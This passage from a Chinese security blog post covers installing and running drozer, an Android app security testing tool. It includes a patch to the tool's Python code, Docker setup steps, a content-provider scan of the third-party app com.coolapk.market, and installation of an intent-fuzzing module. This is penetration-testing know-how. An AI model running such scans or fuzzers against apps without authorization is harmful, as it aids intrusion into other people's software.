<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.finduri com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">exception in module: RuntimeError: drozer could not find or compile a required extension library.</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/console/session.py&quot;, line 394, in do_run</span><br><span class="line">    module.run(argv[1:])</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/base.py&quot;, line 183, in run</span><br><span class="line">    result = self.execute(arguments)</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/app/provider.py&quot;, line 124, in execute</span><br><span class="line">    uris = self.findAllContentUris(arguments.package)</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py&quot;, line 206, in findAllContentUris</span><br><span class="line">    uris = uris.union(self.__search_package(package))</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py&quot;, line 316, in __search_package</span><br><span class="line">    for (path, content_uris) in self.findContentUris(package.packageName):</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py&quot;, line 228, in findContentUris</span><br><span class="line">    dex_file = self.extractFromZip(&quot;classes.dex&quot;, path, self.cacheDir())</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/zip_file.py&quot;, line 14, in extractFromZip</span><br><span class="line">    ZipUtil = self.loadClass(&quot;common/ZipUtil.apk&quot;, &quot;ZipUtil&quot;)</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/loader.py&quot;, line 30, in loadClass</span><br><span class="line">    Module.cache_klass(&quot;.&quot;.join([source, klass]), loader.loadClass(klass))</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py&quot;, line 28, in loadClass</span><br><span class="line">    return self.getClassLoader().loadClass(klass);</span><br><span class="line">  File &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py&quot;, line 51, in getClassLoader</span><br><span class="line">    raise RuntimeError(&quot;drozer could not find or compile a required extension library.\n&quot;)</span><br><span class="line">RuntimeError: drozer could not find or compile a required extension library.</span><br></pre></td></tr></table></figure>
<p>修改 <code>/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def __get_source(self, source_or_relative_path, relative_to=None):</span><br><span class="line">       &quot;&quot;&quot;</span><br><span class="line">       Get source, either from an apk file or passed directly.</span><br><span class="line">       &quot;&quot;&quot;</span><br><span class="line">       </span><br><span class="line">       source = None</span><br><span class="line"></span><br><span class="line">       if source_or_relative_path.endswith(&quot;.apk&quot;):</span><br><span class="line">          ...</span><br><span class="line">           #apk_path = os.path.join(relative_to, *source_or_relative_path.split(&quot;/&quot;))</span><br><span class="line">           apk_path = &quot;/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/ZipUtil.apk&quot;</span><br><span class="line">           java_path = apk_path.replace(&quot;.apk&quot;, &quot;.java&quot;)</span><br><span class="line">           </span><br><span class="line">       ....</span><br><span class="line">       return source</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/issues/361">https://github.com/FSecureLABS/drozer/issues/361</a></p>
<h2 id="drozer-docker"><a href="#drozer-docker" class="headerlink" title="drozer docker"></a>drozer docker</h2><p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/tree/develop/docker">https://github.com/FSecureLABS/drozer/tree/develop/docker</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">手机drozer Server打开Enabled</span><br><span class="line">adb forward tcp:31415 tcp:31415  </span><br><span class="line"></span><br><span class="line">拉取镜像</span><br><span class="line">docker pull fsecurelabs/drozer</span><br><span class="line">启动 这样运行每次都会启动一个docker镜像</span><br><span class="line">docker run -it fsecurelabs/drozer </span><br><span class="line">推荐后台启动</span><br><span class="line">docker run -d -it fsecurelabs/drozer </span><br><span class="line">docker exec -it &lt;container-id&gt; /bin/bash</span><br><span class="line">查询</span><br><span class="line">docker ps -a</span><br><span class="line">重启容器</span><br><span class="line">docker restart 7182d7c77df1  </span><br><span class="line"></span><br><span class="line">root@583ffdf5a998:/# drozer console connect --server 192.168.1.210</span><br><span class="line">Selecting 038941488d55f461 (Google Pixel XL 8.1.0)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line">dz&gt; run scanner.provider.finduris -a com.coolapk.market</span><br><span class="line">Scanning com.coolapk.market...</span><br><span class="line">Unable to Query  content://com.coolapk.market.fileprovider/</span><br><span class="line">Unable to Query  content://downloads/public_downloads</span><br><span class="line">Unable to Query  content://com.coolapk.market.TTMultiProvider/</span><br><span class="line">Unable to Query  content://com.coolapk.market.fileprovider</span><br><span class="line">Unable to Query  content://com.coolapk.market.TTMultiProvider</span><br><span class="line">Unable to Query  content://com.coolapk.market.zbar.FileProvider</span><br><span class="line">Unable to Query  content://com.coolapk.market.TENCENT.MID.V4/</span><br><span class="line">Unable to Query  content://com.coolapk.market.TENCENT.MID.V4</span><br><span class="line">Unable to Query  content://telephony/carriers/preferapn/</span><br><span class="line">Unable to Query  content://com.coolapk.market.zbar.FileProvider/</span><br><span class="line">Unable to Query  content://com.coolapk.market.TTFileProvider</span><br><span class="line">Unable to Query  content://com.coolapk.market.TTFileProvider/</span><br><span class="line">Unable to Query  content://downloads/public_downloads/</span><br><span class="line">Unable to Query  content://com.coolapk.market.utilcode.provider</span><br><span class="line">Unable to Query  content://telephony/carriers/preferapn</span><br><span class="line">Unable to Query  content://com.coolapk.market.utilcode.provider/</span><br><span class="line"></span><br><span class="line">No accessible content URIs found.</span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FSecureLABS/drozer-modules.git</span><br><span class="line"></span><br><span class="line">root@6842e8e0c7b0:/# drozer console connect --server 192.168.11.217</span><br><span class="line">Selecting 29381b23433115c3 (Google Pixel 8.1.0)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line">dz&gt; module repository create /drozer-modules</span><br><span class="line">The target (/drozer-modules) already exists.</span><br><span class="line"></span><br><span class="line">dz&gt; module install /drozer-modules/intents/fuzzinozer.py</span><br><span class="line">You do not have a drozer Module Repository.</span><br><span class="line">Would you like to create one? [yn] y</span><br><span class="line">Path to new repository: /drozer-modules</span><br><span class="line">The target (/drozer-modules) already exists.</span><br><span class="line"></span><br><span class="line">Path to new repository: /drozer-modules1</span><br><span class="line">Initialised repository at /drozer-modules1.</span><br><span class="line"></span><br><span class="line">Processing /drozer-modules/intents/fuzzinozer.py... Done.</span><br><span class="line"></span><br><span class="line">Successfully installed 1 modules, 0 already installed.</span><br><span class="line"></span><br><span class="line">dz&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win查看顶层app</span><br><span class="line">adb shell dumpsys window w |findstr \/ |findstr name=</span><br></pre></td></tr></table></figure>

<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/26503.html">Drozer - Android APP安全评估工具（附测试案例）</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/168cdd3daa1d">Drozer 安装和使用 (Mac)</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/65fc2d52c7b1">Drozer安装(Mac系统)和使用</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/goodhacker/p/3906180.html">利用drozer进行Android渗透测试</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cch139745/article/details/53519900">Drozer模块命令大全（一）</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cch139745/article/details/53691123">Drozer模块命令大全（二）</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇）</a><br><a target="_blank" rel="noopener" href="http://www.blogjava.net/qileilove/archive/2015/03/18/423597.html">利用drozer进行Android渗透测试</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187948">浅析src的app漏洞挖掘</a><br><a target="_blank" rel="noopener" href="http://rui0.cn/archives/30">利用Drozer进行app本地拒绝服务漏洞测试</a>  </p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>tea9</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://tea9.github.io/post/525637870.html">http://tea9.github.io/post/525637870.html</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2017-2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/android/"># android</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/post/42510273.html">2.web安全基础-常见web漏洞解析</a>
            
            
            <a class="next" rel="next" href="/post/1787481902.html">CVE-2017-9993-FFmpeg文件读取漏洞</a>
            
        </section>
    </article>
</div>




            </div>
            <footer id="footer" class="footer">
 
    <div class="copyright">
        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
   
</footer>

    </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>

</html>